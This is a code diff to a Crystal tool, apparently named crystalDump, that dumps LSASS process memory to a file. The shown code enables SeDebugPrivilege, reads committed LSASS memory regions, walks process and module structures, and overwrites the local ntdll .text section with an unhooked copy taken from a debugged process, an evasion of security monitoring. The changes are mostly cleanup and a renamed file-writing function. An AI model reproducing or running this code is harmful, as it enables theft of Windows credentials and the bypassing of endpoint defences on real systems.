@@ -239,23 +239,20 @@ def getMemRegions(lsass_handle : Pointer(Void)) : Array(MemFile)
       sizeof(MEMORY_BASIC_INFORMATION).to_u32,
       nil
     )
-
     if ntstatus != 0
       puts "[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x#{ntstatus.to_s(16)}"
       break
     end
-    #puts "NTSTATUS: 0x#{ntstatus.to_s(16)}"
 
     if mbi.protect != PAGE_NOACCESS && mbi.state == MEM_COMMIT
-      buffer = Bytes.new(mbi.region_size.to_i32) # Create a buffer to read memory region
+      buffer = Bytes.new(mbi.region_size.to_i32)
       read_status = Ntdll.NtReadVirtualMemory(
         lsass_handle,
-        Pointer(Void).new(mbi.base_address), #mbi.base_address,
+        Pointer(Void).new(mbi.base_address),
         buffer.to_unsafe, #pointerof(buffer).as(Pointer(Void)),
         mbi.region_size.to_u32,
         nil
       )
-
       if read_status != 0 && read_status != 0x8000000d
         puts "[-] Error reading memory. NTSTATUS: 0x#{read_status.to_s(16)}"
       else
@@ -272,10 +269,10 @@ end
 
 
 def enable_se_debug_privilege : Bool
-  hProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
-  hToken = LibC::HANDLE.new(0.to_u64)  # Initialize hToken with 0
+  hProcess = Pointer(Void).new(UInt64::MAX)
+  hToken = LibC::HANDLE.new(0.to_u64)
   ntstatus = Ntdll.NtOpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, pointerof(hToken))
-  if ntstatus == 0 # STATUS_SUCCESS
+  if ntstatus == 0
     se_debug_name_utf16 = SE_DEBUG_NAME.to_utf16
     se_debug_name_ptr = se_debug_name_utf16.to_unsafe
     token_privileges = TOKEN_PRIVILEGES.new(
@@ -345,7 +342,7 @@ def get_proc_name_from_handle(process_handle : Pointer(Void)) : String
   end
   peb_offset = 0x8
   peb_pointer = pbi_addr + peb_offset
-  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
+  currentProcess = Pointer(Void).new(UInt64::MAX)
   peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
   processparameters_offset = 0x20
   processparameters_pointer = peb_address + processparameters_offset
@@ -389,7 +386,7 @@ def custom_get_module_handle(h_process : Pointer(Void)) : Array(ModuleInformatio
     return module_information_list
   end
   peb_pointer = pbi_addr + peb_offset
-  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
+  currentProcess = Pointer(Void).new(UInt64::MAX)
   peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
   ldr_pointer = Pointer(UInt64).new(peb_address + ldr_offset)
   ldr_address = readRemoteIntPtr(h_process, ldr_pointer.address)
@@ -500,7 +497,7 @@ def custom_get_module_address(h_process : Pointer(Void), module_name : String ) 
     return 0_u64
   end
   peb_pointer = pbi_addr + peb_offset
-  currentProcess = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
+  currentProcess = Pointer(Void).new(UInt64::MAX)
   peb_address = readRemoteIntPtr(currentProcess, peb_pointer.address)
   ldr_pointer = Pointer(UInt64).new(peb_address + ldr_offset)
   ldr_address = readRemoteIntPtr(h_process, ldr_pointer.address)
@@ -527,11 +524,11 @@ end
 
 
 def get_text_section_info(ntdll_address : Pointer(Void)) : Array(UInt32)
-  h_process = Pointer(Void).new(UInt64::MAX) #0xffffffff... = -1
+  h_process = Pointer(Void).new(UInt64::MAX)
   e_lfanew_data = Bytes.new(4)
   e_lfanew_address = ntdll_address + 0x3C
   Ntdll.NtReadVirtualMemory(h_process, e_lfanew_address, e_lfanew_data.to_unsafe, 4, Pointer(UInt64).null)
-  e_lfanew = e_lfanew_data.to_unsafe.as(UInt32*).value #e_lfanew_data.unpack("I").first
+  e_lfanew = e_lfanew_data.to_unsafe.as(UInt32*).value
   nt_headers_address = ntdll_address + e_lfanew
   optional_header_address = nt_headers_address + 24
   sizeofcode_address = optional_header_address + 4
@@ -557,8 +554,8 @@ def get_ntdll_from_debug_proc(process_path : String) : Pointer(UInt8)
   success = LibC.CreateProcessW(
     process_path.to_utf16, 
     nil, 
-    Pointer(LibC::SECURITY_ATTRIBUTES).null, # Explicitly null for lpProcessAttributes
-    Pointer(LibC::SECURITY_ATTRIBUTES).null, # Explicitly null for lpThreadAttributes
+    Pointer(LibC::SECURITY_ATTRIBUTES).null,
+    Pointer(LibC::SECURITY_ATTRIBUTES).null,
     false, 
     DEBUG_PROCESS, 
     Pointer(Void).null, 
@@ -622,7 +619,6 @@ def replace_ntdll_txt_section(unhooked_ntdll_txt : Void*, local_ntdll_txt : Void
   region_size_ptr = Pointer(UInt64).malloc(1)
   region_size_ptr.value = local_ntdll_txt_size
   dw_old_protection = UInt32.new(0)
-  
   # NtProtectVirtualMemory to PAGE_EXECUTE_WRITECOPY
   vp_res = Ntdll.NtProtectVirtualMemory(
     current_process, 
@@ -635,16 +631,12 @@ def replace_ntdll_txt_section(unhooked_ntdll_txt : Void*, local_ntdll_txt : Void
     puts "[-] Error calling NtProtectVirtualMemory (PAGE_EXECUTE_WRITECOPY)"
     exit(1)
   end
-
-  #STDIN.gets
   # Copy from one address to the other
   unhooked = unhooked_ntdll_txt.as(Pointer(UInt8))
   local = local_ntdll_txt.as(Pointer(UInt8))
   local_ntdll_txt_size.times do |i|
     local[i] = unhooked[i]
   end
-  #STDIN.gets
-
   # NtProtectVirtualMemory back to the original protection (PAGE_EXECUTE_READ)
   vp2_res = Ntdll.NtProtectVirtualMemory(
     current_process, 
@@ -763,7 +755,7 @@ def generate_bytes(os_info : Ntdll::OSVERSIONINFOEXW, module_information_list : 
 end
 
 
-def write_bytes(content : Bytes, file_name : String) : Nil
+def write_to_file(content : Bytes, file_name : String) : Nil
   File.open(file_name, "w") do |file|
     file.write content
   end
@@ -791,7 +783,8 @@ def crystalDump(output_file : String)
   
   # Create file
   dump_bytes = generate_bytes(os_info, module_information_list, memfile_list)
-  write_bytes(dump_bytes, output_file)
+  write_to_file(dump_bytes, output_file)
+  puts "[+] File #{output_file} generated."
 end
 
 
